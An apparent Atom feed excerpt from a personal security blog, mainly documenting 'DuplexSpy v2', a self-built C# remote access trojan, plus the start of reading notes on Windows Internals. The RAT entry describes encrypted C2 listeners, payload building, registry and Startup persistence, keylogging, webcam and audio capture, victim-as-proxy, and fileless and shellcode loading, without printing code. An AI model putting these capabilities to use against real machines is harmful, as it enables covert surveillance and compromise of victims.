    <category term="Tool" scheme="https://iss4cf0ng.github.io/tags/Tool/"/>
    
    <category term="DLL Injection" scheme="https://iss4cf0ng.github.io/tags/DLL-Injection/"/>
    
    <category term="Shell Injection" scheme="https://iss4cf0ng.github.io/tags/Shell-Injection/"/>
    
    <category term="DLL Loader" scheme="https://iss4cf0ng.github.io/tags/DLL-Loader/"/>
    
    <category term="Shell Loader" scheme="https://iss4cf0ng.github.io/tags/Shell-Loader/"/>
    
  </entry>
  
  <entry>
    <title>[Tools] DuplexSpy v2.0.0</title>
    <link href="https://iss4cf0ng.github.io/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"/>
    <id>https://iss4cf0ng.github.io/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/</id>
    <published>2026-01-27T16:29:37.000Z</published>
    <updated>2026-02-22T17:23:16.723Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>This document describes <strong>DuplexSpy</strong> (also referred to as <strong>DuplexSpyCS</strong>, where <em>CS</em> stands for C#).</p><p>If you are reading this document, I am glad to announce the release of <strong>DuplexSpy version 2</strong>, after more than six months of the version 1. During this period, I struggled with various emotional and academic issues, which once led me into depression. Fortunately, I managed to overcome one of my biggest personal challenges (even though it might seem trivial to others).</p><p align="center" class='item-img' data-src='/images/meme/hakari_crying.jpeg'><img src="/images/meme/hakari_crying.jpeg" width="600"></p><p>As a college student, developing a GUI-based remote access tool entirely on my own—and performing proper quality assurance (QA)—has been a significant challenge for me. Due to limited time, experience, and resources, this project may still contain defects or design flaws that I have not yet discovered. Nevertheless, I believe that I have successfully built a RAT that incorporates a variety of offensive techniques and practical features.</p><p align="center" class='item-img' data-src='/images/meme/terrible_cake.png'><img src="/images/meme/terrible_cake.png" width="300"></p><p>If you find this project helpful or informative, I would truly appreciate a ⭐ on the repository. Your support would be a great motivation for me to continue improving this tool.</p><p align="center" class='item-img' data-src='/images/meme/mika_yeah.png'><img src="/images/meme/mika_yeah.png" width="300"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p><strong>DuplexSpy</strong> incorporates features inspired by other tools as well as my own personal experience. Compared to the previous version, I removed several features that I considered unnecessary and added a number of new ones. Throughout this development process, I learned a great deal, and I sincerely hope that this project can be useful to others who are interested in offensive security or malware research.</p><p>If you encounter any issues or have suggestions, please feel free to open an issue on the repository page.</p><p>View the GitHub repository <a href="https://github.com/iss4cf0ng/DuplexSpyCS">here</a>.</p><h1 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h1><p>This project was developed as part of my personal interest in studying cybersecurity. However, it may potentially be misused for malicious purposes. Please do <strong>NOT</strong> use this tool for any illegal activities.</p><p align="center" class='item-img' data-src='/images/meme/mika_punch.jpg'><img src="/images/meme/mika_punch.jpg" width="500"></p><h1 id="Getting-Start"><a href="#Getting-Start" class="headerlink" title="Getting Start"></a>Getting Start</h1><h2 id="Directory-and-Files"><a href="#Directory-and-Files" class="headerlink" title="Directory and Files"></a>Directory and Files</h2><p>Directory structure is shown as following:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/main/3.png'><img src="/images/article/tools/duplexspy/main/3.png" width="700"></p><h2 id="Deploy"><a href="#Deploy" class="headerlink" title="Deploy"></a>Deploy</h2><p>Execute <code>DuplexSpyCS.exe</code>. This is the home page of DuplexSpy:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/main/1.png'><img src="/images/article/tools/duplexspy/main/1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/main/2.png'><img src="/images/article/tools/duplexspy/main/2.png" width="700"></p><h2 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h2><p>A listener is an interface component of <strong>DuplexSpy</strong>. It acts as a socket listener on the server side. DuplexSpy provides three types of listeners, all of which offer secure and robust communication protocols.</p><h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><p>The data stream transmitted through this protocol is encrypted after a key exchange procedure. The server generates an RSA key pair and sends the public key to the client. The client then uses this public key to encrypt an AES key and an initialization vector (IV), and sends them back to the server.</p><p>After receiving the encrypted AES key and IV, the server decrypts them and stores them in memory. During the validation phase, the server sends a plaintext challenge to the client. The client responds with an encrypted version of the challenge using the AES algorithm. If the server can successfully decrypt the response using the stored AES key and IV, the validation procedure is considered complete. The server then notifies the client to enter the compromised state.</p><p>This protocol uses RSA-2048 and AES-256-CBC.</p><h3 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h3><p>This protocol provides a secure and robust communication channel for C2 traffic. Before using this listener, you must generate an SSL certificate file.</p><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>All data are encapsulated within HTTP requests and responses. This listener also provides an encrypted communication channel to protect C2 traffic. Its handshaking procedure is identical to that of the TCP listener described above.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/http.1.png'><img src="/images/article/tools/duplexspy/listener/http.1.png" width="1000"></p><h2 id="Add-a-New-Listener"><a href="#Add-a-New-Listener" class="headerlink" title="Add a New Listener"></a>Add a New Listener</h2><p>In this example, I am going to demonstrate how to add a new listener.</p><p>Firstly, click the <strong>New</strong> button on the top.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/1.png'><img src="/images/article/tools/duplexspy/listener/1.png" width="700"></p><p>Now you have opened a new panel.</p><p>Select a protocol used for listener (In this case, I use <strong>TLS</strong>):</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/2.png'><img src="/images/article/tools/duplexspy/listener/2.png" width="400"></p><p>Notice that you should create a certificate file if you are going to use a TLS listener. </p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/3.png'><img src="/images/article/tools/duplexspy/listener/3.png" width="400">    <figcaption>    Save configuration without SSL certificate file.    </figcaption></p><p>You can create a certificate file through <code>openssl</code> command or using DuplexSpy. </p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/5.png'><img src="/images/article/tools/duplexspy/listener/5.png" width="400"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/6.png'><img src="/images/article/tools/duplexspy/listener/6.png" width="400"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/7.png'><img src="/images/article/tools/duplexspy/listener/7.png" width="700"></p><p>DuplexSpy checks the listener configuration before it shows. If a mal-config is detected. The state of your listener will be turned into <strong>unavailable</strong>.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/4.png'><img src="/images/article/tools/duplexspy/listener/4.png" width="700"></p><h2 id="Generate-a-Payload"><a href="#Generate-a-Payload" class="headerlink" title="Generate a Payload"></a>Generate a Payload</h2><p>DuplexSpy currently provides a single payload type. In the previous version, three different payload types were available, but issues were discovered in the other two. These will be addressed in a future release.</p><p>To generate a payload, click <strong>Build</strong> on the home page.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/build/1.png'><img src="/images/article/tools/duplexspy/build/1.png" width="400"></p><h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><p>DuplexSpy provides two persistence methods. The first one is copy the payload to <strong>StartUp</strong> directory, and the second method is modifying the registry data. The latter method is called at the end of copying file.</p><h2 id="Infected"><a href="#Infected" class="headerlink" title="Infected"></a>Infected</h2><p>Like other remote access tools, the target can be infected by directly executing the <code>.exe</code> file. Once the remote machine is compromised and successfully connects to the server, it will appear as an available item on the home page.</p><p>If you see this, congratulations, you can now use the provided functions.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/build/2.png'><img src="/images/article/tools/duplexspy/build/2.png" width="700"></p><p>The context menu displays all available functions.</p><h1 id="Manager"><a href="#Manager" class="headerlink" title="Manager"></a>Manager</h1><p>The <strong>Manager</strong> provides the following remote administration features:</p><ul><li>File Manager</li><li>Task Manager</li><li>Service Manager</li><li>Registry Editor</li><li>Connection View</li><li>Window Manager</li></ul><h2 id="File-Manager"><a href="#File-Manager" class="headerlink" title="File Manager"></a>File Manager</h2><p>The File Manager provides the following functions:</p><ul><li><strong>Show Image</strong></li><li><strong>New</strong></li><li><strong>Edit</strong></li><li><strong>Copy</strong></li><li><strong>Paste</strong></li><li><strong>Move</strong></li><li><strong>Delete</strong></li><li><strong>Upload</strong></li><li><strong>Download</strong></li><li><strong>WGET</strong></li><li><strong>Archive</strong></li><li><strong>Datetime</strong></li><li><strong>Shortcut</strong></li><li><strong>Copy Path</strong></li></ul><p>Toolbar functions:</p><ul><li><strong>Home</strong></li><li><strong>Parent</strong></li><li><strong>Refresh</strong></li><li><strong>New</strong></li><li><strong>Select</strong></li><li><strong>Execute</strong></li><li><strong>Shell</strong></li><li><strong>Find</strong></li></ul><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/file.1.png'><img src="/images/article/tools/duplexspy/manager/file.1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/file.2.png'><img src="/images/article/tools/duplexspy/manager/file.2.png" width="700"></p><h2 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h2><ul><li><strong>Injector</strong> – Perform DLL or shellcode injection, <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/">click this</a> to learn more about this feature.</li><li><strong>Start</strong>:</li><li><strong>Kill</strong></li><li><strong>Kill + Delete</strong></li><li><strong>Suspend</strong></li><li><strong>Resume</strong></li><li><strong>Copy</strong></li><li><strong>Find Antivirus</strong></li></ul><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/task.1.png'><img src="/images/article/tools/duplexspy/manager/task.1.png" width="700"></p><h2 id="RegEdit"><a href="#RegEdit" class="headerlink" title="RegEdit"></a>RegEdit</h2><p>DuplexSpy implements a simple registry editor with a GUI similar to <code>regedit.exe</code></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/reg.1.png'><img src="/images/article/tools/duplexspy/manager/reg.1.png" width="700"></p><h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><p>Displays all Windows services on the compromised machine.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/serv.1.png'><img src="/images/article/tools/duplexspy/manager/serv.1.png" width="700"></p><h2 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h2><p>Displays all active network connections.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/conn.1.png'><img src="/images/article/tools/duplexspy/manager/conn.1.png" width="700"></p><h2 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h2><p>Displays all open windows and provides the following features:</p><ul><li><strong>Capture</strong><ul><li><strong>GetDC</strong></li><li><strong>Foreground</strong></li></ul></li><li><strong>Go to TaskMgr</strong></li><li><strong>Copy</strong></li><li><strong>Thread</strong><ul><li><strong>Suspend</strong></li><li><strong>Resume</strong></li></ul></li></ul><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/window.1.png'><img src="/images/article/tools/duplexspy/manager/window.1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/window.2.png'><img src="/images/article/tools/duplexspy/manager/window.2.png" width="700"></p><h1 id="Terminal"><a href="#Terminal" class="headerlink" title="Terminal"></a>Terminal</h1><p>DuplexSpy provides two types of <code>cmd.exe</code> terminal and a WQL console.</p><h2 id="Virtual-Terminal"><a href="#Virtual-Terminal" class="headerlink" title="Virtual Terminal"></a>Virtual Terminal</h2><p>A traditional virtual terminal commonly found in RATs.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/terminal/shell.png'><img src="/images/article/tools/duplexspy/terminal/shell.png" width="700"></p><h2 id="Xterm-Terminal"><a href="#Xterm-Terminal" class="headerlink" title="Xterm Terminal"></a>Xterm Terminal</h2><p>Inspired by <strong>MobaXterm</strong>, this terminal provides an interactive console supporting tools such as:</p><ul><li><code>nc.exe</code></li><li><code>python</code></li><li><code>nmap</code></li><li><code>sqlmap</code></li><li><code>ssh</code></li><li><code>telnet</code></li><li><code>netsh</code></li></ul><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/terminal/xterm.png'><img src="/images/article/tools/duplexspy/terminal/xterm.png" width="700"></p><h2 id="WQL"><a href="#WQL" class="headerlink" title="WQL"></a>WQL</h2><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/terminal/wql.png'><img src="/images/article/tools/duplexspy/terminal/wql.png" width="700"></p><h1 id="Desktop"><a href="#Desktop" class="headerlink" title="Desktop"></a>Desktop</h1><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/monitor/1.png'><img src="/images/article/tools/duplexspy/monitor/1.png" width="700"></p><h1 id="Webcam"><a href="#Webcam" class="headerlink" title="Webcam"></a>Webcam</h1><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/webcam/1.png'><img src="/images/article/tools/duplexspy/webcam/1.png" width="700"></p><h1 id="Audio"><a href="#Audio" class="headerlink" title="Audio"></a>Audio</h1><p>Captures audio streams from microphones or speakers. The received audio can be saved as an <code>.mp3</code> file.</p><h1 id="FunStuff"><a href="#FunStuff" class="headerlink" title="FunStuff"></a>FunStuff</h1><p>Inspired by the classic <strong>Beast RAT</strong>, this module provides a collection of interactive and demonstrative features, including:</p><ul><li><strong>MessageBox</strong></li><li><strong>Balloon Tips</strong></li><li><strong>Toggle</strong><ul><li><strong>Mouse</strong><ul><li>Hide / Show the mouse cursor</li><li>Lock / Unlock the mouse cursor</li><li>Enable / Disable mouse trails</li></ul></li><li><strong>hWnd</strong><ul><li>Hide / Show the system tray</li><li>Hide / Show the system clock</li><li>Hide / Show the taskbar</li><li>Hide / Show the Start Orb (the Start button at the lower-left corner of the screen)</li></ul></li><li><strong>Keyboard</strong><ul><li><strong>Smile</strong>: Replace all keyboard input with a smiley face. For example, typing <code>HelloWorld</code> will result in ten 😊 characters.</li><li>Enable / Disable keyboard input</li></ul></li></ul></li><li><strong>Image</strong><ul><li><strong>Wallpaper</strong>: Change or retrieve the current wallpaper of the compromised machine</li><li><strong>LockScreen</strong>: Display a specified image while disabling keyboard input and hiding the mouse cursor</li></ul></li></ul><h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1><p>The <strong>Proxy</strong> feature is designed to demonstrate a common misconception: some people believe that compromising their computer is harmless because it contains no important data. This assumption is incorrect. Even if no sensitive data is present, a compromised machine can still be abused as a proxy to conceal the attacker’s real identity.</p><p>The <strong>Proxy</strong> function establishes a listener on the C2 server and accepts SOCKS5 connections from users. Network traffic is then forwarded through the compromised machine. The overall architecture is illustrated below:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/10.png'><img src="/images/article/tools/duplexspy/proxy/10.png" width="1000"></p><p>This feature allows attackers to browse the internet, watch YouTube, or even perform <strong>SSH logins to remote servers</strong> through the compromised host.</p><p>To learn more, please <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyProxy/">click here</a>.</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Keylogger"><a href="#Keylogger" class="headerlink" title="Keylogger"></a>Keylogger</h2><p>Years ago, when I was a beginner in cybersecurity, I was curious about how a keylogger could endanger user credentials if it only logged keystrokes. Later, I realized that the issue lies in practical design rather than raw data itself.</p><p>DuplexSpy demonstrates how an offensive keylogger is implemented—not only recording the keys pressed by the user, but also capturing the timestamp and the active window title.</p><p align="center" class='item-img' data-src='https://raw.githubusercontent.com/iss4cf0ng/DuplexSpyCS/refs/heads/main/png/keylogger.png'><img src="https://raw.githubusercontent.com/iss4cf0ng/DuplexSpyCS/refs/heads/main/png/keylogger.png" width="700"></p><h2 id="Chat-Message"><a href="#Chat-Message" class="headerlink" title="Chat Message"></a>Chat Message</h2><p>This feature allows you to have a conversation with the user who is currently logged on to the compromised machine.<br>Currently, it supports single-user sessions and text messages only.</p><h2 id="Run-Script"><a href="#Run-Script" class="headerlink" title="Run Script"></a>Run Script</h2><p>Execute customized scripts. DuplexSpy provides three types of executable scripts:</p><ul><li>Batch</li><li>C#</li><li>VB.NET</li></ul><p>Both C# and VB.NET scripts are executed filelessly, while Batch scripts are not.</p><h2 id="PC-Power"><a href="#PC-Power" class="headerlink" title="PC Power"></a>PC Power</h2><p>This function includes:</p><ul><li>Restart</li><li>Logout</li><li>Shutdown</li><li>Sleep</li></ul><p>All actions will be executed after a specified delay.<br>Note that the compromised machine will be disconnected after the action is triggered.</p><h2 id="Fileless-Execution"><a href="#Fileless-Execution" class="headerlink" title="Fileless Execution"></a>Fileless Execution</h2><p>This feature allows you to execute a PE file without writing it to disk (<strong>fileless execution</strong>).</p><p>To learn more, please <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyFilelessExec/">click this</a>.</p><h2 id="DLL-Loader"><a href="#DLL-Loader" class="headerlink" title="DLL Loader"></a>DLL Loader</h2><p>This feature writes a DLL to a temporary file (<code>%temp%</code>) and loads it using Win32 APIs.<br>Note that this feature is <strong>not fileless</strong>.</p><p>To learn more, please <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/">click this</a>.</p><h2 id="Shellcode-Loader"><a href="#Shellcode-Loader" class="headerlink" title="Shellcode Loader"></a>Shellcode Loader</h2><p>Load shellcode directly into memory. This feature <strong>IS FILELESS</strong>.</p><p>To learn more, please <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/">click this</a>.</p><h1 id="Plugin"><a href="#Plugin" class="headerlink" title="Plugin"></a>Plugin</h1><p>This feature allows you to load a .NET Framework 4.8 assembly into memory, pass parameters to it, and execute customized functions.</p><p>To learn more, please <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyPlugin/">click this</a>.</p><h1 id="Batch"><a href="#Batch" class="headerlink" title="Batch"></a>Batch</h1><p>For convenience, DuplexSpy provides several features grouped under <strong>Batch</strong>.<br>These functions allow you to execute multiple operations or commands described above in a single workflow.</p><h2 id="Desktop-1"><a href="#Desktop-1" class="headerlink" title="Desktop"></a>Desktop</h2><p>This idea is inspired by CCTV monitoring systems.<br>Each page displays up to 9 desktops.</p><h2 id="Webcam-1"><a href="#Webcam-1" class="headerlink" title="Webcam"></a>Webcam</h2><p>This idea is also inspired by CCTV monitoring systems.<br>Each page displays up to 9 webcams. Unlike <strong>Multi-Desktop</strong>, webcam images are not displayed automatically.</p><h2 id="Lock-Screen"><a href="#Lock-Screen" class="headerlink" title="Lock Screen"></a>Lock Screen</h2><p>This idea comes from the comic <em>Keroro Gunso</em>.<br>In the story, an alien character hijacks multiple computers and displays a star logo while their team invades Earth.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/lockscreen/1.png'><img src="/images/article/tools/duplexspy/lockscreen/1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/lockscreen/2.png'><img src="/images/article/tools/duplexspy/lockscreen/2.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/lockscreen/3.png'><img src="/images/article/tools/duplexspy/lockscreen/3.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/lockscreen/4.png'><img src="/images/article/tools/duplexspy/lockscreen/4.png" width="700"></p><h2 id="Run-Script-1"><a href="#Run-Script-1" class="headerlink" title="Run Script"></a>Run Script</h2><p>Send customized scripts to compromised machines.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/runscript/1.png'><img src="/images/article/tools/duplexspy/runscript/1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/runscript/2.png'><img src="/images/article/tools/duplexspy/runscript/2.png" width="700"></p><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>Open a URL or download an executable from a specified URL.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/url/1.png'><img src="/images/article/tools/duplexspy/url/1.png" width="700"></p><h1 id="Connection-1"><a href="#Connection-1" class="headerlink" title="Connection"></a>Connection</h1><ul><li><strong>Reconnect</strong>: Notify the remote computer to reconnect to the server.</li><li><strong>Disconnect</strong>: Notify the remote computer to disconnect from the server. The payload will be terminated.</li></ul><h1 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h1><ul><li><strong>Sleep</strong>: Disconnect from the C2 server and reconnect after a specified delay.</li><li><strong>Update</strong>: Send a new payload to the compromised machine, delete the old payload, and execute the new one (<strong>not fileless</strong>).</li><li><strong>Remove</strong>: Terminate and delete the payload on the compromised machine.</li></ul><h1 id="Local"><a href="#Local" class="headerlink" title="Local"></a>Local</h1><p>Some functions are executed on your server only:</p><ul><li><strong>Open Folder</strong>: When a compromised machine is online, DuplexSpy creates a dedicated folder for it. This feature allows you to open the folder via <code>explorer.exe</code>.</li><li><strong>Highlight</strong>: Highlight the selected items.</li></ul><h1 id="Copy"><a href="#Copy" class="headerlink" title="Copy"></a>Copy</h1><p>This function also runs on your server only.<br>It allows you to copy the online ID or IPv4 address to your clipboard.</p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Preface&quot;&gt;&lt;a href=&quot;#Preface&quot; class=&quot;headerlink&quot; title=&quot;Preface&quot;&gt;&lt;/a&gt;Preface&lt;/h1&gt;&lt;p&gt;This document describes &lt;strong&gt;DuplexSpy&lt;/strong&gt;</summary>
      
    
    
    
    <category term="Tools/DuplexSpy" scheme="https://iss4cf0ng.github.io/categories/Tools-DuplexSpy/"/>
    
    
    <category term="Code" scheme="https://iss4cf0ng.github.io/tags/Code/"/>
    
    <category term="C#" scheme="https://iss4cf0ng.github.io/tags/C/"/>
    
    <category term="Program" scheme="https://iss4cf0ng.github.io/tags/Program/"/>
    
    <category term="DuplexSpy" scheme="https://iss4cf0ng.github.io/tags/DuplexSpy/"/>
    
    <category term="RAT" scheme="https://iss4cf0ng.github.io/tags/RAT/"/>
    
    <category term="Documentation" scheme="https://iss4cf0ng.github.io/tags/Documentation/"/>
    
  </entry>
  
  <entry>
    <title>[Book] Windows Internal Part 2</title>
    <link href="https://iss4cf0ng.github.io/2026/01/26/2026-1-26-BookWindowsInternal-P2/"/>
    <id>https://iss4cf0ng.github.io/2026/01/26/2026-1-26-BookWindowsInternal-P2/</id>
    <published>2026-01-26T03:30:22.000Z</published>
    <updated>2026-01-27T07:34:05.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/WindowsInternal2/libro.jpg'><img src="/images/books/WindowsInternal2/libro.jpg" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Windows Internal Part 2”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[Book] Windows Internal Part 1</title>
    <link href="https://iss4cf0ng.github.io/2026/01/26/2026-1-26-BookWindowsInternal-P1/"/>
    <id>https://iss4cf0ng.github.io/2026/01/26/2026-1-26-BookWindowsInternal-P1/</id>
    <published>2026-01-26T03:29:20.000Z</published>
    <updated>2026-02-17T07:48:53.192Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/libro.jpg'><img src="/images/books/WindowsInternal1/libro.jpg" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Windows Internal Part 1”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><h1 id="Chapter-1-Concepts-and-Tools"><a href="#Chapter-1-Concepts-and-Tools" class="headerlink" title="Chapter 1 - Concepts and Tools"></a>Chapter 1 - Concepts and Tools</h1><h2 id="Fundation-concepts-and-terms"><a href="#Fundation-concepts-and-terms" class="headerlink" title="Fundation concepts and terms"></a>Fundation concepts and terms</h2><h3 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h3><p>The Windows application programming interface (API) is the user-mode system programming interface to the Windows OS family. Prior to the introduction of 64-bit versions of Windows, the API to the 32-bit versions of the Windows OS was called the Win32 API to distinguish it from the original 16-bit Windows API.</p><p>The term Windows API refers to both the 32-bit and 64-bit API to Windows.</p><h3 id="Windows-API-flavors"><a href="#Windows-API-flavors" class="headerlink" title="Windows API flavors"></a>Windows API flavors</h3><p>COM was originally created to enable Microsoft Office applications to communicate and exchange data between documents (such as embedding an Excel chart inside a Word document or a PowerPoint presentation). This ability is called Object Linking and Embedding (OLE). OLE was originally implemented using an old Windows messaging mechanism called Dynamic Data Exchange (DDE).</p><p>COM is baed on two foundational principles. First, client communicate with objects (sometimes called COM server object) through interfaces——well-defined contracts with a set of logically related methods grouped under the virtual table dispatch mechanism, wich is also a common way for C++ compilers to implement virtual functions dispatch.<br>The second principle is that component implementation is loaded dynamically rather than being statically linked to the client.</p><p>The term COM server typically refers to a Dynamic Link Library (DLL) or an executable (EXE) where the COM classes are implemented.</p><h3 id="The-Windows-Runtime"><a href="#The-Windows-Runtime" class="headerlink" title="The Windows Runtime"></a>The Windows Runtime</h3><p>Windows 8 introduced a new API and supporting runtime called Windows Runtime (sometimes abbreviated WinRT, not to be confused with Windows RT, the discontinued ARM-based Windows OS version).</p><p>From an API perspective, WInRT is built on top of COM, adding various extensions to the base COM infrastructure.</p><p><strong>The .NET Framework</strong><br>The .NET Framework is part of Windows.</p><div class="table-container"><table><thead><tr><th>Windows Version</th><th>.NET Framework Version</th></tr></thead><tbody><tr><td>Windows 8</td><td>4.5</td></tr><tr><td>Windows 8.1</td><td>4.5.1</td></tr><tr><td>Windows 10</td><td>4.6</td></tr><tr><td>Windows 10 version 1511</td><td>4.6.1</td></tr><tr><td>Windows 10 version 1607</td><td>4.6.2</td></tr></tbody></table></div><p>The .NET Framework consists of two major components:</p><ul><li><strong>The Common Language Runtime (CLT)</strong></li><li><strong>The .NET Framework Class Library (FCL)</strong></li></ul><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/1.1.png'><img src="/images/books/WindowsInternal1/1.1.png" width="600"></p><h3 id="Services-functions-and-routines"><a href="#Services-functions-and-routines" class="headerlink" title="Services, functions, and routines"></a>Services, functions, and routines</h3><ul><li><strong>Windows API functions</strong></li><li><strong>Native system service (or system calls)</strong></li><li><strong>Kernel support functions (or routines)</strong></li></ul><h3 id="Processes"><a href="#Processes" class="headerlink" title="Processes"></a>Processes</h3><p>Although programs and process appear similar on the surface, they are fundamentally different.</p><p>A <em>program</em> is a static sequence of instructions, whereas a <em>process</em> is a container for a set of resources used when executing the instance of the program.</p><ul><li><strong>A private virtual address space</strong></li><li><strong>An executable program</strong></li><li><strong>A list of open handles</strong></li><li><strong>A security context</strong></li><li><strong>A process ID</strong></li><li><strong>At least one thread of execution</strong></li></ul><h3 id="Threads"><a href="#Threads" class="headerlink" title="Threads"></a>Threads</h3><p>A <em>thread</em> is an entity within a process that Windows schedules for execution. Without it, the process’s program can’t run. A thread includes the follow essential components:</p><ul><li>The contents of a set of CPU registers representing the state of the processor</li><li>Two stacks——one for the thread to use while executing in kernel mode and one for executing in user mode.</li><li>A private storage area called <em>thread-lcoal storage (TLS)*</em> for use by subsystems, run-time libraries, and DLLs.</li><li>A unique identifier called a <em>thread ID</em> (part of an internal structure called a <em>client ID</em>; process IDs and thread IDs are generated out of the same namespace, so they never overlap)</li></ul><p>The threads of a 32-bit application running on a 64-bit version of WIndows will contain both 32-bit and 64-bit context, which Wow64 will use to switch the applicaion from running in 32-bit to 64-bit mode when required. These threads will have two user stacks and two <strong>CONTEXT</strong> blocks, and the usual Windows API functions will return the 64-bit context instead. The <code>Wow64GetThreadContext</code> function, however, will return the 32-bit context.</p><h4 id="Fibers"><a href="#Fibers" class="headerlink" title="Fibers"></a>Fibers</h4><p>Fibers allow an application to schedule its own threads of execution rather than rely on the priority-based scheduling mechanism built into Windows. Fibers are often called <em>lightweight threads</em>. In terms of scheduling, they are invisible to the kernel because they are implementeed in user mode in <code>kernel32.dll</code>. To use fibers, you first make a call to the Windows <code>ConvertThreadToFiber</code> function. This function converts the thread to a running fiber. Afterward, the newly converted fiber can create additonal fibers via the <code>CreateFiber</code> function (Each fiber can have its own set of fibers).</p><h4 id="User-mode-scheduling-threads"><a href="#User-mode-scheduling-threads" class="headerlink" title="User-mode scheduling threads"></a>User-mode scheduling threads</h4><p>User-mode schedulnig (UMS) threads, which are available only on 64-bit versions of Windows, provide the same basic advantages as fibers——and only a few of the disadvantages. UMS threads have their own kernel thread stat and are therefore visible to the kernel, which allows multiple UMS threads to issue blocking system calls and share and contend on resources.</p><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/1.2.png'><img src="/images/books/WindowsInternal1/1.2.png" width="600"></p><h3 id="Jobs"><a href="#Jobs" 